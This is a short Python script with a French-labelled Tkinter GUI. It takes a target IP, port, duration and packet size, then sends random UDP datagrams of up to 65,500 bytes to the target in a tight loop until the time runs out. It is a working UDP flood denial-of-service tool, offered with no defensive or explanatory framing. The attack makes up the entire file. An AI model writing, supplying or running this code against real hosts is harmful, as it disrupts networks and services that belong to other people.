from tkinter import *
import random,socket,os,time,sys
fen = Tk()

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes  = os.urandom(65500)


class settings:
    ip = ""
    port = ""
    time = ""
    data = ""

class fenetre:
    geometry = "500x500"
    title = "salut"


def boot():


    now = time.time()
    duration = int(settings.time)
    i = 0
    restant = 1

    bytes  = os.urandom(int(settings.data))
    port = int(settings.port)
    ip = str(settings.ip)
    i = 0
    while(True):
        i = i + 1
        tempo2 = time.time()
        if restant < 0:
            total = i * int(settings.data)
            print("total : ",total)
            return 0
        else:

            i = i + 1
            sock.sendto(bytes,(ip,port))
            ecoule = tempo2 - now
            restant = duration - ecoule

            restant = round(restant,2)
            sys.stdout.write("\r" +"Sent : "+ settings.data + " bytes to " + ip + ":" + str(port) + " temps restant " + str(restant) +"s")
            sys.stdout.flush()




fen.title(fenetre.title)
fen.geometry(fenetre.geometry)

def setting():
    settings.ip = ip.get()
    settings.port = port.get()
    settings.time = temps.get()
    settings.data = data.get()

textip = Label(fen, text = "ip : ")
textip.grid(row = 1,column = 1,sticky = W)

textport = Label(fen, text = "port : ")
textport.grid(row = 2,column = 1,sticky = W)

texttime = Label(fen, text = "time : ")
texttime.grid(row = 3,column = 1,sticky = W)

textdata = Label(fen, text = "data : ")
textdata.grid(row = 4,column = 1,sticky = W)

tempsrestant = Label(fen, text = " ")
tempsrestant.grid(row = 10, column = 10, sticky = W)



ip = Entry(fen, textvariable = StringVar())
ip.grid(row = 1, column=2, sticky = W)

port = Entry(fen)
port.grid(row = 2, column=2, sticky = W)

temps = Entry(fen)
temps.grid(row = 3, column=2, sticky = W)

data = Entry(fen)
data.grid(row = 4, column=2, sticky = W)

quitter = Button(text = "quitter",command = fen.destroy)
quitter.grid(row = 5,column = 3,sticky = S+E)


submit = Button(fen,text = "submit",command = setting)
submit.grid(row = 5, column=2)

lancer = Button(fen, text = "lancer",command = boot)
lancer.grid(row = 5, column = 1)

fen.mainloop()